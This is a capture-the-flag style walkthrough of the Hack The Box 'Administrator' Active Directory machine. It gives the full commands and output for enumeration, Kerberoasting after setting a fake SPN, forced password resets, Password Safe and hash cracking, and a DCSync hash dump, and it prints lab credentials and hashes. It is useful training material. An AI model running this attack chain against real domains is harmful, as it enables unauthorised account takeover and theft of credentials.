---
title: Administrator - Walkthrough Only
date: 03-10-2026
tags:
  - HTB
  - Windows
  - Medium
---
![[Administrator_Machine_Image.png]]
# 🎯 Summary
**Administrator** is an Hack The Box machine that focuses on Windows **Active Directory** ACLs vulnerabilities. It provides unprivileged domain credentials from the outset to mimic a real-world assessment. The initial foothold involves identifying and exploiting misconfigured ACLs discovered through **domain enumeration**. Moving laterally among the domain users, abusing privileges granted to them, manipulating Service Principal Names (SPNs) and cracking hashes to obtain their credentials, leads to full domain compromise through a **DCSync attack**. 

The following tools were utilised to compromise the machine from initial access to root:
- [**Nmap**](https://nmap.org): Service Discovery and Port Identification 
- **[NetExec](https://www.netexec.wiki/) / [Smbclient](https://linux.die.net/man/1/smbclient)**: SMB Share Discovery and Interaction
- **[Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)**: Kerberoasting Attack
- [**Hashcat:**](https://hashcat.net/hashcat/): PSafe3 and NTLM Hash Cracking
- [**BloodHound**](https://specterops.io/bloodhound-community-edition/): Domain Enumeration
- [**bloodyAD**](https://github.com/CravateRouge/bloodyAD): Assign SPNs to Domain Users
- [**Faketime**](https://www.unix.com/man_page/debian/1/faketime/):  Bypass Kerberos Time-Skew Issues 
- [**Net (SMB Tool)**](https://www.samba.org/samba/docs/current/man-html/net.8.html): Domain Users Password Change
- [**PasswordSafe**](https://github.com/pwsafe/pwsafe): Open and Manage PSafe3 Files
- [**Evil-WinRM**](https://github.com/Hackplayers/evil-winrm): Remote Access on the host
- [**Impacket secretsdump**](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py): DCSync Attack
# 🔍 Reconnaissance
As always the first step is to scan the target host to enumerate the **externally exposed service** utilizing the `Nmap` tool:
```
$ nmap -Pn -n -p- -sC -sV 10.129.2.63 -oA Scans/Administrator_all
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-10 08:52 +0100
Nmap scan report for 10.129.2.63
Host is up (0.031s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-10 14:53:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>

Host script results:
| smb2-time: 
|   date: 2026-03-10T14:54:29
|_  start_date: N/A
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.87 seconds
```

The scan output shows port **21 (FTP)**, ports **88, 464 (Kerberos)**, ports **139, 445  (SMB)** and ports **389, 636, 3268 (LDAP)** as open; we can consider them as a possible **vectors** for our foothold.
The host is running Windows OS and it is a **Domain Controller (DC)**; furthermore in the "Host script results" section is highlighted a **clock-skew** of seven (7) hours, an important detail to consider for our attacks.

Having received valid domain credentials (olivia:ichliebedich) we start the DC enumeration from the FTP service, looking for some sensitive files:
```
$ ftp 10.129.2.63                                                                            
Connected to 10.129.2.63.
220 Microsoft FTP Service
Name (10.129.2.63:luca): olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
```

Olivia account seems to be **unauthorized** to login in the **FTP** service so we proceed to verify if it can access the SMB share folders using the `smbclient` tool:
```
$ smbclient -L //10.129.2.63/ -U "olivia"             
Password for [WORKGROUP\olivia]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.2.63 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The output of the command returns a list of folders so we utilize the `NetExec` tool to discover which rights are granted to Olivia account:
```
$ nxc smb 10.129.2.63 -u olivia -p ichliebedich --shares
SMB         10.129.2.63     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.129.2.63     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.129.2.63     445    DC               [*] Enumerated shares
SMB         10.129.2.63     445    DC               Share           Permissions     Remark
SMB         10.129.2.63     445    DC               -----           -----------     ------
SMB         10.129.2.63     445    DC               ADMIN$                          Remote Admin
SMB         10.129.2.63     445    DC               C$                              Default share
SMB         10.129.2.63     445    DC               IPC$            READ            Remote IPC
SMB         10.129.2.63     445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.2.63     445    DC               SYSVOL          READ            Logon server share 
```

`NetExec` reveals that it has **READ** privilege on the **SYSVOL**, **NETLOGON** and **IPC$** folders; our next step is to spider the content of the **SYSVOL** folder searching for Group Policy Preferences (GPP) XML files that could contain system credentials:
```
$ nxc smb 10.129.2.63 -u olivia -p ichliebedich --spider SYSVOL --content --pattern ".xml"
SMB         10.129.2.63     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.129.2.63     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.129.2.63     445    DC               [*] Started spidering
SMB         10.129.2.63     445    DC               [*] Spidering .
SMB         10.129.2.63     445    DC               [*] Done spidering (Completed in 4.546615362167358)
```

Since no files were found by the `NetExec` tool, we proceed to **manually** explore the content of the SYSVOL folder looking for scripts or other files that could provide users credentials embedded in the code:
```
$ smbclient //10.129.2.63/SYSVOL -U "olivia"         
Password for [WORKGROUP\olivia]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct  4 21:48:08 2024
  ..                                  D        0  Fri Oct  4 21:48:08 2024
  administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024

                5606911 blocks of size 4096. 2079063 blocks available
smb: \> cd administrator.htb\
smb: \administrator.htb\> ls
  .                                   D        0  Fri Oct  4 21:54:15 2024
  ..                                  D        0  Fri Oct  4 21:48:08 2024
  DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
  Policies                            D        0  Fri Oct  4 21:48:32 2024
  scripts                             D        0  Fri Oct  4 21:48:08 2024

                5606911 blocks of size 4096. 2079063 blocks available
<SNIP>
smb: \administrator.htb\> cd Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> get comment.cmtx 
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\comment.cmtx of size 553 as comment.cmtx (4,5 KiloBytes/sec) (average 4,5 KiloBytes/sec)
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> get Registry.pol 
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol of size 184 as Registry.pol (1,5 KiloBytes/sec) (average 3,0 KiloBytes/sec)
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> quit
```

In the sub-folders we identify the **comment.cmtx** and **Registry.pol** files: once downloaded and opened on our testing environment,  we discover that **no useful information** was stored in them.
We proceed with the DC enumeration utilizing the `rpcclient` tool to enumerate the **domain users** taking advantage of the Olivia account credentials:
```
$ rpcclient -U "olivia"  10.129.2.63
Password for [WORKGROUP\olivia]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
rpcclient $> exit
```

The tool returned a list of domain users composed by the username and their Relative Identifier (RID), the final portion of a Security Identifier (SID).
To be able to use it with other tools we need to "clean" the output of the command as follow: 
1. Copy manually the output in a file
2. Open the file with `cat` and piping the output two (2) times to the `cut` tool: first time to take all the text after the `[` and the second time to keep the text before the `]`
3. Redirect the output to a new file
   
```
$ nano users.lst
$ cat users.lst | cut -d '[' -f 2 | cut -d ']' -f 1 > users_mod.lst
$ cat users_mod.lst 
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
```

Obtained the users list we decide to verify if the attribute "**UF_DONT_REQUIRE_PREAUTH**" was set on some domain account utilizing the `Impacket's GetNPUsers` tool, paired with the `Faketime` tool, to avoid issues due to the **clock-skew** identified earlier with the `Nmap` scan. This is done to verify the presence of accounts vulnerable to an **ASREPRoasting attack**.
```
$ faketime -f "2026-03-10 16:54:30" impacket-GetNPUsers  -dc-ip 10.129.2.63 -usersfile users_mod.lst administrator.htb/olivia:ichliebedich
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

The output of the command reveals that **no user** is vulnerable. Our next step is to verify if some account in the domain has the Service Principal Name (**SPN**) attribute set to execute a **Kerberoasting attack** utilizing the `Impacket's GetUserSPNs` tool:
```
$ faketime -f "2026-03-10 16:55:30" impacket-GetUserSPNs -target-domain administrator.htb -dc-ip 10.129.2.63 administrator.htb/olivia 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
No entries found!
```

The SPN attribute is **not set** for any users so we proceed to explore the host file-system obtaining a PowerShell terminal through the `Evil-WinRM` tool:
```
$ evil-winrm -i 10.129.2.63 -u "olivia" -p "ichliebedich"                             
<SNIP>
*Evil-WinRM* PS C:\Users\olivia\Documents> ls c:\Users\


    Directory: C:\users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         3/10/2026   8:57 AM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

Under the "Users" folder we identify a second user, **Emily**, which lead us to search for a path to take control of that account.
To analyse all the permission grant to the Olivia account and also gain more information about all the domain users and their rights on the domain objects, we proceed to utilize `BloodHound-python` tool:
```
$ bloodhound-python -u "olivia" -p 'ichliebedich' -ns 10.129.2.63 -d administrator.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 07S
```

The tool saves the scan results in JSON files; to upload them all in one (1) shot we create a ZIP archive and start the `BloodHound` local instance:
```
$ zip -r Administrator_domain *.json 
  adding: 20260310101229_computers.json (deflated 75%)
  adding: 20260310101229_containers.json (deflated 93%)
  adding: 20260310101229_domains.json (deflated 79%)
  adding: 20260310101229_gpos.json (deflated 85%)
  adding: 20260310101229_groups.json (deflated 94%)
  adding: 20260310101229_ous.json (deflated 69%)
  adding: 20260310101229_users.json (deflated 94%)

$ bloodhound                                                                                 
[sudo] password di luca: 
```

Once `BloodHound` is fully initialised and the ZIP archive uploaded, we move in the "Explore" section searching for the Olivia account and  setting it as "Owned":
![[Olivia_owned.png]]

Looking under the "Outbound Object Control" section of the account details, in the right panel, we discover that the Olivia account has "**GenericAll**" privileges on the Michael account.
To control the target user we could attempt a **Shadow Credentials** attack, add the SPN attribute to execute a **Kerberoasting** attack or **change** its password:
![[Olivia_ACL_Michael.png]]

# ⚔️ Exploitation
Usually change the user password is the **last option**; this is done to keep our actions more stealthy and avoid issues related to the user daily activities.
For these reasons we proceed to attempt the Shadow Credentials attack extracting **Michael account's certificate** and consequently obtain its Ticket Granting Ticket (TGT).
As the first step of the attack we utilize the `pywhisker.py` script for the certificate extraction as follow:
```
$ python3 pywhisker.py -d "administrator.htb" -u "olivia" -p "ichliebedich" --target "michael" --action "add" --dc-ip 10.129.2.63
[*] Searching for the target account
[*] Target user found: CN=Michael Williams,CN=Users,DC=administrator,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2b6dacc3-f590-0ad5-63a2-6ce8cb2ff580
[*] Updating the msDS-KeyCredentialLink attribute of michael
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: bA295cf0.pfx
/home/luca/Pentest/Administrator/Evidence/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: bA295cf0.pfx
[i] Passwort für PFX: AlGvjN3iE6m2MrCa5q7F
[+] Saved PFX (#PKCS12) certificate & key at path: bA295cf0.pfx
[*] Must be used with password: AlGvjN3iE6m2MrCa5q7F
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Obtained the certificate we proceed with the **TGT request** utilizing the `certipy-ad` tool providing the certificate and its password as input attributes:
```
$ certipy-ad auth -pfx bA295cf0.pfx -password AlGvjN3iE6m2MrCa5q7F -dc-ip 10.129.2.63 -username michael -domain administrator.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'michael@administrator.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

The tool fails due to the fact that the Domain Controller (DC) **does not support PKINIT**, the protocol required to exchange a certificate for a Kerberos TGT.
This error lead us to opt for our second choice: add the SPN attribute to the Michael account, through the `bloodyAD` tool, to be able to execute a **Kerberoasting attack**.
```
$ bloodyAD -u olivia -p ichliebedich -d administrator.htb --host 10.129.2.63 set object michael  servicePrincipalName -v 'nonexistent/fake'

[+] michael's servicePrincipalName has been updated
```

Having updated the SPN attribute for the Michael account we utilize again the `Impacket's GetUserSPNs`, paired with the `Faketime` tool, to **export its TGT** and save it in a file for the next phase of the attack:
```
$ faketime -f "2026-03-10 18:07:30" impacket-GetUserSPNs -dc-ip 10.129.2.63 administrator.htb/olivia -request -outputfile michael_TGT
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name     MemberOf                                                       PasswordLastSet             LastLogon  Delegation 
--------------------  -------  -------------------------------------------------------------  --------------------------  ---------  ----------
nonexistent/fake      michael  CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb  2024-10-06 03:33:37.049043  <never>  
<SNIP>
```

Obtained the TGT, we proceed to crack it **offline** with `Hashcat` to reveal the clear text value of Michael account's password:
```
$ hashcat -a 0 -m 13100 michael_TGT /usr/share/wordlists/rockyou.txt.gz -D 1,2        
hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrato...36b215
Time.Started.....: Tue Mar 10 11:11:33 2026 (3 secs)
Time.Estimated...: Tue Mar 10 11:11:36 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2757.4 kH/s (11.84ms) @ Accel:549 Loops:1 Thr:32 Vec:1
Speed.#03........:  1639.9 kH/s (2.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  4397.4 kH/s
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14304426/14344385 (99.72%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: *abc12* -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: *hooky87* -> *abcd*
Hardware.Mon.#01.: Temp: 54c Util: 50% Core:1097MHz Mem:2505MHz Bus:8
Hardware.Mon.#03.: Temp: 75c Util: 58%

Started: Tue Mar 10 11:11:29 2026
Stopped: Tue Mar 10 11:11:38 2026
```

The offline cracking process **failed** leaving us with no other choice than to **change the Michael account's password**.
To do so we utilize `SMB net` tool combined with the Olivia's credentials:
```
$ net rpc password "michael" 'Password123!' -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.129.2.63"
```

Owning also the Michael account we go back to `BloodHound` and repeat the process, looking under the "Outbound Object Control" section, identifying  the "**ForceChangePassword**" privilege on the Benjamin account:
 ![[Michael_ACL_Benjamin.png]]

As done previously for the Micheal account we proceed to **change** the Benjamin account's password, utilizing the `SMB net` tool:
```
$ net rpc password "benjamin" 'Password123!' -U "administrator.htb"/"michael"%'Password123!' -S "10.129.2.63"
```

Having access to Benjamin account we search on `BloodHound` in which groups it has membership and which privileges are granted to it:
![[Benjamin_group_membership.png]]

Benjamin account does not have any interesting privileges but it is a member of the "**SHARE MODERATORS**" domain group which lead us to think that it has access to the **FTP service**.
Knowing that, we proceed to access the FTP service:
```
$ ftp 10.129.2.63
Connected to 10.129.2.63.
220 Microsoft FTP Service
Name (10.129.2.63:luca): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
```

Since the access was granted, we explore the content of the FTP folder discovering the "**Backup.psafe3**" file and downloading it on our testing environment for an in-depth analysis:
```
ftp> ls
229 Entering Extended Passive Mode (|||51026|)
150 Opening ASCII mode data connection.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||59052|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   952       28.80 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (28.70 KiB/s)
```

First step of the analysis  is to identify the typology of the file with the terminal command `file`:
```
$ file Backup.psafe3 
Backup.psafe3: Password Safe V3 database
```

Discovering that it is a **Password Safe file**, we try to open it with the `pwsafe` tool to check its content:
```
pwsafe Backup.psafe3 
```
![[PWSafe_masterkey_request.png]]

The backup file is protected with a **master key** so we need to process it with `Hashcat` to try to crack its clear text value; this is one of the few file type where we pass it directly to `Hashcat` instead of extract its hash with a tool from the John The Ripper Suite:
```
$ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 

hashcat (v7.1.2) starting

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Backup.psafe3:txxxxxxxxxxo                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Tue Mar 10 13:05:57 2026 (1 sec)
Time.Estimated...: Tue Mar 10 13:05:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   182.5 kH/s (9.13ms) @ Accel:4 Loops:256 Thr:768 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 15360/14344385 (0.11%)
Rejected.........: 0/15360 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> stewart1
Hardware.Mon.#01.: Temp: 43c Util: 62% Core:1176MHz Mem:2505MHz Bus:8

Started: Tue Mar 10 13:05:55 2026
Stopped: Tue Mar 10 13:05:59 2026
```

**Obtained** the master key we proceed to reopen the backup file to explore its content and find credentials for other domain users:
```
pwsafe Backup.psafe3 
```
![[PWsafe_opened.png]]

Among the usernames, **Emily** rigs a bell because it is the user that we discovered earlier during our file-system exploration.

# 🚩 Post-Exploitation
Connecting again to the DC with `Evil-WinRM` utilizing Emily account's credentials, we access its profile and discover the **user.txt** file under the Desktop folder, revealing its content:
```
$ evil-winrm -i 10.129.2.63 -u "emily" -p 'UXLxxxxxxxxxxxxxxxxxxxxxxxXmb'
<SNIP>
*Evil-WinRM* PS C:\Users\emily\Documents> whoami
administrator\emily
*Evil-WinRM* PS C:\Users\emily\Documents> hostname
dc
*Evil-WinRM* PS C:\Users\emily\Documents> ls ../desktop


    Directory: C:\Users\emily\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         3/10/2026   7:39 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Documents> type ../desktop/user.txt
22ddxxxxxxxxxxxxxxxxxxxxxxxx073b
```

Obtained the first flag of the machine, our next step is to verify on `BloodHound` which **privileges are granted** to the Emily account.
Going again under the "Outbound Object Control" section we discover that it possesses "**GenericWrite**" privilege over the Ethan account.
To take advantage of this privilege we proceed to add the SPN attribute to Ethan account, using the `bloodyAD` tool, to be able to execute a **Kerberos attack** designed to obtain its TGT hash:
```
$ bloodyAD -u emily -p "UXLxxxxxxxxxxxxxxxxxxxxxxxXmb" -d administrator.htb --host 10.129.2.63 set object ethan  servicePrincipalName -v 'nonexistent/fake2'
[+] ethan's servicePrincipalName has been updated
```

Having updated the Ethan account's attribute, we utilize again `Impacket's GetUserSPNs` tool paired with `Faketime` to extract its **TGT hash** and store it in a file:
```
$ faketime -f "2026-03-10 20:38:30" impacket-GetUserSPNs -dc-ip 10.129.2.63 administrator.htb/emily -request-user ethan -outputfile ethan_hash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
nonexistent/fake2     ethan            2024-10-12 22:52:14.117811  <never>              
```

To obtain the clear text value of Ethan account's password, we process the hash **offline** with `Hashcat`:
```
$ hashcat -a 0 -m 13100 ethan_hash /usr/share/wordlists/rockyou.txt 
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator..<SNIP>..a0aa61:lixxxxxxxt
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....a0aa61
Time.Started.....: Tue Mar 10 13:41:19 2026 (0 secs)
Time.Estimated...: Tue Mar 10 13:41:19 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5272.0 kH/s (11.97ms) @ Accel:547 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 87520/14344385 (0.61%)
Rejected.........: 0/87520 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> tillie1
Hardware.Mon.#01.: Temp: 37c Util: 52% Core:1097MHz Mem:2505MHz Bus:8

Started: Tue Mar 10 13:41:18 2026
Stopped: Tue Mar 10 13:41:20 2026
```

The cracking operation is **successful** so we gained control over the Ethan account.
Going back to `BloodHound`, we verify which privileges are granted to the Ethan account and discover that "**GetChanges**" and "**GetChangesAll**" are set:
![[Ethan_ACL_Domain.png]]
 
 With these privileges it is possible to execute a **DCSync attack** and exfiltrate all the domain users NTLM hashes **fully compromising** the domain.
 To execute this attack we utilize the `Impacket's secretsdump` tool combined with Ethan account credentials to **dump all the secrets** and save all the NTLM hashes in an output file:
```
$ impacket-secretsdump -just-dc administrator.htb/ethan@10.129.2.63 -outputfile domain_hashes               
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc5xxxxxxxxxxxxxxxxxxxxxxxxfd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181xxxxxxxxxxxxxxxxxxxxxxxxfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb20xxxxxxxxxxxxxxxxxxxxxxxx0f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2bxxxxxxxxxxxxxxxxxxxxxxxx9884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9xxxxxxxxxxxxxxxxxxxxxxxx0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecxxxxxxxxxxxxxxxxxxxxxxxx55c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf41xxxxxxxxxxxxxxxxxxxxxxxxd4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161dxxxxxxxxxxxxxxxxxxxxxxx853a04e9e69664
<SNIP>
```

To try to obtain the domain users clear text passwords we process the output file **offline** with `Hashcat`:
```
$ hashcat -a 0 -m 1000 domain_hashes.ntds /usr/share/wordlists/rockyou.txt -D 1,2

hashcat (v7.1.2) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5c2bxxxxxxxxxxxxxxxxxxxxxxxx9884:lixxxxxxxt               
fbaa3e2294376dc0f5aeb6b41ffa52b7:ichliebedich             
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: domain_hashes.ntds
Time.Started.....: Tue Mar 10 15:14:43 2026 (1 sec)
Time.Estimated...: Tue Mar 10 15:14:44 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6132.8 kH/s (5.56ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#03........:  3391.1 kH/s (0.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  9523.8 kH/s
Recovered........: 3/10 (30.00%) Digests (total), 2/10 (20.00%) Digests (new)
